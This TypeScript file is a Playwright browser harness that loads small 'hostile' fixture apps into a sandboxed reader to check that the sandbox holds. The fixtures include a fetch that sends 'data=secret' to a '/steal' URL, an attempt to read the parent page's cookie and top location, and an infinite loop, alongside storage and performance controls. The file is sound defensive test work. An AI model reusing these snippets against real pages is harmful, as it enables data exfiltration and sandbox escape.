/**
 * Browser harness for the Playwright tier. Bundled to an IIFE and loaded into
 * a real Chromium page; the spec drives it via `window.PoidHarness`.
 *
 * Each hostile app is a single-file document that attempts one attack and
 * reports the outcome to the parent via a `{ probe }` message — a channel
 * separate from the POID bridge (which ignores anything without `poid: 1`).
 */

import type { Capability } from "@poid/sdk";
import type { ConsentManifest } from "@poid/ui";
import {
  IdbSqlPersistence,
  makeSqlHandlers,
  mountReader,
  type ReaderHandle,
  type SqlHandlers,
} from "../src/index.js";

// Injected at bundle time: the @poid/sdk sandbox bootstrap, minified to an IIFE.
declare const __SDK_SOURCE__: string;

const HOSTILE_APPS: Record<string, string> = {
  // fetch() to any origin must be blocked by CSP (connect-src 'none'), not by
  // the SDK. The app has no poid.net (network not granted) and tries raw fetch.
  fetch: `<!doctype html><html><body><script>
    (async () => {
      try {
        await fetch("https://example.com/steal?data=secret");
        parent.postMessage({ probe: "fetch", blocked: false }, "*");
      } catch (e) {
        parent.postMessage({ probe: "fetch", blocked: true, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // Escaping the sandbox: reading parent/top cross-origin must throw.
  escape: `<!doctype html><html><body><script>
    let blocked = false, detail = "";
    try { void parent.document.cookie; detail = "read parent.document"; }
    catch (e) { blocked = true; detail = String(e); }
    try { void top.location.href; } catch (e) { blocked = true; }
    parent.postMessage({ probe: "escape", blocked, detail }, "*");
  </script></body></html>`,

  // An app that hangs its event loop after load: the watchdog must trip.
  loop: `<!doctype html><html><body><script>
    parent.postMessage({ probe: "loop-start" }, "*");
    setTimeout(() => { while (true) {} }, 30);
  </script></body></html>`,

  // Positive control: the whole stack (bootstrap → bridge → broker → engine)
  // works in a real browser and a kv round-trip succeeds.
  good: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        await poid.db.kv.set("note", "hello");
        const v = await poid.db.kv.get("note");
        parent.postMessage({ probe: "kv", ok: v === "hello", value: v }, "*");
      } catch (e) {
        parent.postMessage({ probe: "kv", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // The Data Engine's document tier through the real sandbox → broker → SQL
  // engine path (M10): insert, query, then re-read what a prior run left.
  docs: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        const cards = poid.db.docs.collection("cards");
        const seenBefore = await cards.count({});
        await cards.insert({ title: "Ship M10", column: "doing", order: 1 });
        await cards.insert({ title: "Write docs", column: "todo", order: 2 });
        const doing = await cards.find({ column: "doing" });
        parent.postMessage({
          probe: "docs",
          ok: doing.length === 1 && doing[0].title === "Ship M10",
          total: await cards.count({}),
          seenBefore,
        }, "*");
      } catch (e) {
        parent.postMessage({ probe: "docs", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // The 10k-row perf check (M10 DoD): build the table, then time an indexed
  // point query — it must return in well under 50 ms.
  perf: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        await poid.db.sql.exec("CREATE TABLE items(id INTEGER PRIMARY KEY, tag TEXT, n INTEGER)");
        await poid.db.sql.exec("CREATE INDEX idx_tag ON items(tag)");
        await poid.db.sql.transaction(async (tx) => {
          await tx.exec(
            "WITH RECURSIVE s(v) AS (SELECT 1 UNION ALL SELECT v+1 FROM s WHERE v < 10000) " +
            "INSERT INTO items(id, tag, n) SELECT v, 'tag-' || (v % 100), v FROM s"
          );
        });
        const count = await poid.db.sql.exec("SELECT COUNT(*) AS n FROM items");
        const t0 = performance.now();
        const q = await poid.db.sql.exec("SELECT id, n FROM items WHERE tag = ? ORDER BY id", ["tag-42"]);
        const ms = performance.now() - t0;
        parent.postMessage({
          probe: "perf",
          ok: count.rows[0].n === 10000 && q.rows.length === 100,
          rows: q.rows.length,
          total: count.rows[0].n,
          ms,
        }, "*");
      } catch (e) {
        parent.postMessage({ probe: "perf", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,
};

interface Probe {
  probe: string;
  [k: string]: unknown;
}

const probes: Probe[] = [];
window.addEventListener("message", (ev) => {
  const d = ev.data as { probe?: unknown };
  if (d && typeof d === "object" && typeof d.probe === "string") probes.push(d as Probe);
});

let current: ReaderHandle | undefined;
let sqlHandlers: SqlHandlers | undefined;

function stage(): HTMLElement {
  let s = document.getElementById("stage");
  if (!s) {
    s = document.createElement("div");
    s.id = "stage";
    document.body.append(s);
  }
  return s;
}

function manifest(): ConsentManifest & { instanceId: string; storageMode: "embedded" } {
  return {
    name: "Hostile Fixture",
    version: "1.0.0",
    author: "Attacker",
    signature: "none",
    instanceId: "instance-hostile",
    storageMode: "embedded",
    permissions: {
      network: [],
      filesystem: "none",
      clipboard: false,
      print: false,
      notifications: false,
      mcp: [],
    },
  };
}

interface MountArgs {
  kind: string;
  watchdog?: { intervalMs: number; timeoutMs: number };
  /** IndexedDB name for the SQL tier; a stable name across mounts models a
   * reader restart on the same instance's data. */
  sqlDb?: string;
  /** The instance id the session runs under (default `instance-hostile`). */
  instanceId?: string;
}

const PoidHarness = {
  // Kicks off the mount (which synchronously renders consent) but does NOT
  // await the consent decision — the spec clicks Run/Cancel separately.
  mount(args: MountArgs): void {
    probes.length = 0;
    current = undefined;
    const html = HOSTILE_APPS[args.kind];
    if (!html) throw new Error(`unknown hostile app ${args.kind}`);
    const files = new Map<string, Uint8Array>([["app/index.html", new TextEncoder().encode(html)]]);
    const capabilities: Capability[] = [
      "app",
      "db.kv",
      "db.sql",
      "db.docs",
      "db.slots",
      "ui",
      "export",
    ];
    const instanceId = args.instanceId ?? "instance-hostile";

    sqlHandlers = undefined;
    void (async (): Promise<void> => {
      if (args.sqlDb) {
        sqlHandlers = makeSqlHandlers({
          wasm: { wasmUrl: "/wa-sqlite.wasm" },
          persistence: await IdbSqlPersistence.open(args.sqlDb),
        });
      }
      const handle = await mountReader({
        container: stage(),
        files,
        entry: "app/index.html",
        manifest: { ...manifest(), instanceId },
        capabilities,
        sdkSource: __SDK_SOURCE__,
        watchdog: args.watchdog,
        handlers: sqlHandlers ? { sql: sqlHandlers.sql, docs: sqlHandlers.docs } : undefined,
      });
      current = handle;
    })();
  },
  /** Awaits the SQL tier's write-behind persists, so the next mount (a
   * "restart") is guaranteed to see committed data. */
  async flushSql(): Promise<void> {
    await sqlHandlers?.flush();
  },
  run(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__run")?.click();
  },
  cancel(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__cancel")?.click();
  },
  stop(): void {
    current?.stop();
  },
  probes(): Probe[] {
    return probes;
  },
  hasConsent(): boolean {
    return !!document.querySelector(".poid-consent");
  },
  hasIframe(): boolean {
    return !!stage().querySelector("iframe");
  },
  iframeSandbox(): string | null {
    return stage().querySelector("iframe")?.getAttribute("sandbox") ?? null;
  },
  isUnresponsive(): boolean {
    return !!document.querySelector(".poid-chrome--unresponsive");
  },
};

(window as unknown as { PoidHarness: typeof PoidHarness }).PoidHarness = PoidHarness;
